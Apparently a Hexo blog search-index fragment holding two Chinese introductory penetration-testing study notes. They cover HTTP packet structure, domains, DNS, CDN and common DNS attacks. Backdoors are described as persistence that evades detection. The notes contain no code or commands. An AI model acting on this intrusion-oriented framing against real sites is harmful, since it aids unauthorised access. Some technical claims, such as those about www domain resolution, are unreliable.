        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>当从浏览器访问时，使用代理(Proxy)可以抓取请求数据包(Request)进行分析，或者从Web Server返回数据包(Response)进行分析；BurpSuit其实就很典型，可以作为代理服务器，实现上述作用。</p><h2 id="Http和Https"><a href="#Http和Https" class="headerlink" title="Http和Https"></a>Http和Https</h2><p>http包抓到后一般都是明文的，https通常是密文的，加密的。</p><p><strong>http简要通信过程：</strong></p><p>1.浏览器建立与web服务器之间的连接</p><p>2.浏览器将请求数据打包（生成请求数据包）并发送到web服务器</p><p>3.web服务器将处理结果打包（生成响应数据包）并发送给浏览器</p><p>4.web服务器关闭连接</p><p><strong>https简要通信过程</strong></p><p>1.https请求</p><p>2.服务器响应</p><p>3.证书校验，生成密码，公钥加密</p><p>4.加密信息</p><p>5.私钥解密，解密握手 消息，验证HASH</p><p>6.加密信息</p><p>7.解密握手消息，验证HASH</p><p>8.正常加密通信</p><h1 id="Request请求数据包格式"><a href="#Request请求数据包格式" class="headerlink" title="Request请求数据包格式"></a>Request请求数据包格式</h1><p>1.请求行：请求类型&#x2F;请求资源路径、协议的版本和类型</p><p> 2.请求头：一些键值对，浏览器与 web 服务器之间都可以发送，特定的某种含义</p><p>3.空行：请求头与请求体之间用一个空行隔开</p><p> 4.请求体：要发送的数据(一般 post 提交会使用)；例：user&#x3D;123&amp;pass&#x3D;123</p><p>###请求行</p><p>请求行由三个标记组成：请求方法、请求 URL 和 HTTP 版本，它们用空格分享。 </p><p>例如：</p><p>GET &#x2F;index.html HTTP&#x2F;1.1 HTTP 规划定义了 8 种可能的请求方法：</p><p> GET：检索 URL 中标识资源的一个简单请求</p><p> HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档 </p><p>POST：服务器接受被写入客户端输出流中的数据的请求</p><p> PUT：服务器保存请求数据作为指定 URL 新内容的请求</p><p> DELETE：服务器删除 URL 中命令的资源的请求 </p><p>OPTIONS：关于服务器支持的请求方法信息的请求 </p><p>TRACE：web 服务器反馈 Http 请求和其头标的请求 </p><p>CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理</p><h3 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h3><p>由关键字&#x2F;值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。 </p><p><strong>HOST</strong>: 主机或域名地址 </p><p>Accept：指浏览器或其他客户可以接爱的 MIME 文件格式。</p><p>Servlet 可以根据它判断并返回适当的文件格 式。</p><p> User-Agent：是客户浏览器名称</p><p><strong>Host</strong>：对应网址 URL 中的 Web 名称和端口号。 </p><p>Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。 </p><p>connection：用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的，HTTP&#x2F;1.1 使用 Keep-Alive 为默认值，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立 连接</p><p> <strong>Cookie</strong>：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载 和服务器相关的用户信息，也可以用来实现会话功能。 </p><p><strong>Referer</strong> ： 表 明 产 生 请 求 的 网 页 URL 。 如 比 从 网 页 &#x2F;icconcept&#x2F;index.jsp 中 点 击 一 个 链 接 到 网 页 &#x2F;icwork&#x2F;search ， 在 向 服 务 器 发 送 的 GET&#x2F;icwork&#x2F;search 中 的 请 求 中 ， Referer 是 <a href="http://hostname:8080/icconcept/index.jsp%E3%80%82%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E8%B7%9F%E8%B8%AA">http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪</a> Web 请求是从什么网站来的。</p><p> Content-Type：用来表名 request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。 </p><p>Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1. Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加 速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。</p><p><strong>X-Forwarded-For</strong>： 是一个 HTTP 扩展头部。HTTP&#x2F;1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP。</p><p> X-Real-IP：这又是一个自定义头部字段。X-Real-IP 通常被 HTTP 代理用来表示与它产生 TCP 连接的设备 IP，这个设备可能是其他代理，也可能是真正的请求端。需要注意的是，X-Real-IP 目前并不属于任何标准，代理和 Web 应用之间可以约定用任何自定义头来传递这个信息。</p><h3 id="请求空行"><a href="#请求空行" class="headerlink" title="请求空行"></a>请求空行</h3><p>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</p><p>用于分割POST请求的请求头，和请求体。</p><h3 id="请求数据"><a href="#请求数据" class="headerlink" title="请求数据"></a>请求数据</h3><p>使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。</p><p>封装POST请求消息的请求参数。</p><h2 id="Response返回数据包数据格式"><a href="#Response返回数据包数据格式" class="headerlink" title="Response返回数据包数据格式"></a>Response返回数据包数据格式</h2><p>一个响应由四个部分组成；状态行、响应头标、空行、响应数据。</p><p>1.状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔 </p><p>2.响应头标：包含服务器类型、日期、长度、内容类型等 </p><p>3.空行：响应头与响应体之间用空行隔开 </p><p>4.响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面</p><p>HTTP 响应码：</p><p> 1xx：信息，请求收到，继续处理</p><p> 2xx：成功，行为被成功地接受、理解和采纳 </p><p>3xx：重定向，为了完成请求，必须进一步执行的动作 </p><p>4xx：客户端错误 </p><p>5xx：服务器错误</p><p>200  存在文件</p><p>403  存在文件夹</p><p>3xx  均可能存在</p><p>404  不存在文件及文件夹 </p><p>500  均可能存在</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础入门-概念名词</title>
      <link href="/2022/01/22/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/"/>
      <url>/2022/01/22/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>一、<strong>域名定义</strong>：就好比个人的名字，网站基本都有域名，网站地址名称。通俗点其实就是URL。</p><p>百度官方解释：</p><p>域名（英语：Domain Name），又称网域，是由一串用点分隔的名字组成的<a href="https://baike.baidu.com/item/Internet">Internet</a>上某一台<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA/140338">计算机</a>或计算机组的名称，用于在数据传输时对计算机的定位标识（有时也指地理位置）。</p><p>由于<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80/150859">IP地址</a>具有不方便记忆并且不能显示地址组织的名称和性质等缺点，人们设计出了域名，并通过网域名称系统（<a href="https://baike.baidu.com/item/DNS">DNS</a>，Domain Name System）来将域名和<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80">IP地址</a>相互<a href="https://baike.baidu.com/item/%E6%98%A0%E5%B0%84/20402621">映射</a>，使人更方便地访问<a href="https://baike.baidu.com/item/%E4%BA%92%E8%81%94%E7%BD%91/199186">互联网</a>，而不用去记住能够被机器直接读取的<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80">IP地址</a>数串。</p><p>二、<strong>域名级别不同</strong></p><p>1、带WWW的域名：带WWW的域名的域名级别可以是一级域名，也可以是二级域名。</p><p>2、不带WWW的域名：不带WWW的域名级别一定是一级域名。</p><p>三、<strong>域名解析不同</strong></p><p>1、带WWW的域名：带WWW的域名的不能直接进行域名解析，需要重定向才可域名解析。</p><p>2、不带WWW的域名：不带WWW的域名可以直接进行域名解析。</p><p>四、<strong>域名发现对于安全测试意义：</strong></p><p>（www.称为主站）多级域名的收集在测试时候会多一种可能性，</p><p>主站找不到突破口，就到主站下面的多级域名站中找突破口，如果在多级域名站中找到突破口获得一定权限，就可以在主站中获得一定权限。</p><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>一、<strong>DNS定义：主要用于域名与IP地址的相互转换。</strong></p><p><strong>域名系统</strong>（<a href="https://baike.baidu.com/item/%E8%8B%B1%E6%96%87">英文</a>：<strong>D</strong>omain <strong>N</strong>ame <strong>S</strong>ystem，<a href="https://baike.baidu.com/item/%E7%BC%A9%E5%86%99">缩写</a>：<strong>DNS</strong>）是<a href="https://baike.baidu.com/item/%E4%BA%92%E8%81%94%E7%BD%91">互联网</a>的一项服务。它作为将<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D">域名</a>和<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80">IP地址</a>相互<a href="https://baike.baidu.com/item/%E6%98%A0%E5%B0%84">映射</a>的一个<a href="https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93">分布式数据库</a>，能够使人更方便地访问<a href="https://baike.baidu.com/item/%E4%BA%92%E8%81%94%E7%BD%91">互联网</a>。DNS使用<a href="https://baike.baidu.com/item/UDP">UDP</a><a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3">端口</a>53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p><p>二、<strong>DNS宇本地host文件的关系：</strong></p><p>网站在解析IP地址的时候，当去ping此网站的时候，网站先会去本地的host文件中去看一下有没有这个域名所对应的IP地址，如果有，则解析host文件中的IP地址 ，如果没有，则去互联网上的DNS服务器上去解析域名所对应的IP地址。</p><p><strong>（此方法可以使访问者访问你想要让访问者访问的IP地址）</strong></p><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p><strong>CDN:缓存节点技术</strong></p><p>CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C/4034265">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p><p>百度图片：</p><p><img src="/2022/01/22/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/4610b912c8fcc3ce005c05d19c45d688d53f20b0.png"></p><p><strong>CDN与DNS的关系</strong>：</p><p>CDN实际上是一个就近访问，那么现在有一个问题是，我们怎么知道用户的所在位置从而给他分配最佳的CDN节点呢。这就需要DNS服务来进行定位了。当我们通过使用DNS服务的时候，可以根据他使用的LDNS服务器来进行一个定位，例如我们的调度服务器看到他是来自深圳电信的LDNS服务器，那么我们就认为该用户来自深圳电信，然后调度服务器可以让该用户去访问深圳电信的CDN服务器，这样就让用户访问到了最优的CDN节点。</p><p> 通过DNS服务我们可以很快的定位到用户的位置，然后给用户分配最佳CDN节点，但是这种调度方式存在一个问题，例如，当我 是北京联通的用户但是使用的却是深圳电信的LDNS的话，调度服务器会给我分配到深圳电信的CDN服务器，这样就产生了错误的调度。</p><h2 id="常见的DNS安全攻击："><a href="#常见的DNS安全攻击：" class="headerlink" title="常见的DNS安全攻击："></a>常见的DNS安全攻击：</h2><p><strong>缓存投毒：</strong></p><p>通常也称为域名系统投毒或DNS缓存投毒。它是利用虚假Internet地址替换掉域名系统表中的地址，进而制造破坏。当网络用户在带有该虚假地址的页面中进行搜寻，以访问某链接时，网页浏览器由于受到该虚假条目的影响而打开了不同的网页链接。在这种情况下，蠕虫、木马、浏览器劫持等恶意软件就可能会被下载到本地用户的电脑上</p><p><strong>DNS劫持</strong>：</p><p>DNS劫持又称域名劫持，是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。这类攻击一般通过恶意软件来更改终端用户TCP&#x2F;IP设置，将用户指向恶意DNS服务器，该DNS服务器会对域名进行解析，并最终指向钓鱼网站等被攻击者操控的服务器</p><p><strong>域名劫持：</strong></p><p>域名劫持就是在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则直接返回假的IP地址或者什么也不做使得请求失去响应，其效果就是对特定的网址不能访问或访问的是假网址。一旦您的域名被劫持，用户被引到假冒的网站进而无法正常浏览网页，用户可能被诱骗到冒牌网站进行登录等操作导致泄露隐私数据。</p><p><strong>DNS DDoS攻击：</strong></p><p>针对DNS的DDoS攻击通过控制大批僵尸网络利用真实DNS协议栈发起大量域名查询请求，利用工具软件伪造源IP发送海量DNS查询，发送海量DNS查询报文导致网络带宽耗尽而无法传送正常DNS查询请求。发送大量非法域名查询报文引起DNS服务器持续进行迭代查询，从而达到较少的攻击流量消耗大量服务器资源的目的</p><p><strong>反射式DNS放大攻击：</strong></p><p>所有放大攻击都利用了攻击者和目标Web资源之间的带宽消耗差异，由于每个机器人都要求使用欺骗性IP地址打开DNS解析器，该IP地址已更改为目标受害者的真实源IP地址，然后目标会从DNS解析器接收响应。为了创建大量流量，攻击者以尽可能从DNS解析器生成响应的方式构造请求。结果，目标接收到攻击者初始流量的放大，并且他们的网络被虚假流量阻塞，导致拒绝服务。</p><h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2><p>一、常见脚本语言类型：</p><p>asp php aspx jsp javaweb pl py cgi等</p><p>二、不同脚本类型与安全漏洞的关系：</p><p>由于写网站的源码不同，则所用语言类型也不同，这时就需要掌握各种所写网站的脚本语言去看懂代码挖掘漏洞。</p><p>三、漏洞挖掘代码审计与脚本类型的关系：</p><p>想要找到漏洞，首先就得看懂网站代码，这就是粗略的代码审计，在这之前一定要自己先掌握各种写网站的语言。</p><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>一、什么是后门：攻击者测试或者非法入侵的过程中遗留的后门文件，便于下次进行操作，一般拿到权限后会遗留后门</p><p>二、有哪些后门：（后门只是一个统称，类型很多）网站后门，服务器后门</p><p><strong>三、后门在安全测试中的实际意义：</strong></p><ol><li>方便下次进来</li><li>相当于一个管道，获取一定权限后连接的通道</li></ol><p>免杀：遗留下的后门不被检测到</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>一、web的组成架构模型：</p><ol><li>网站源码：分脚本类型 分应用方向</li><li>操作系统：windows linux</li><li>中间件（搭建平台）：apache iis tomcat nginx等</li><li>数据库：access mysql mssql sqlserver oracle sybase db2 postsql等</li></ol><p>二、Web相关漏洞 ：</p><p>1.Web源码类对应漏洞：</p><p>2.Sql注入，文件上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化等</p><p>3.Web中间件对应漏洞</p><p>4.Web数据库对应漏洞</p><p>5.Web系统层对应漏洞</p><p>6.其他第三方对应漏洞</p><p>APP或PC应用结合类</p><p>有些app打开和pc端打开后的网站一模一样，两者没什么区别，核心都是网站</p><p><strong>App也是通过各种协议传输数据</strong></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
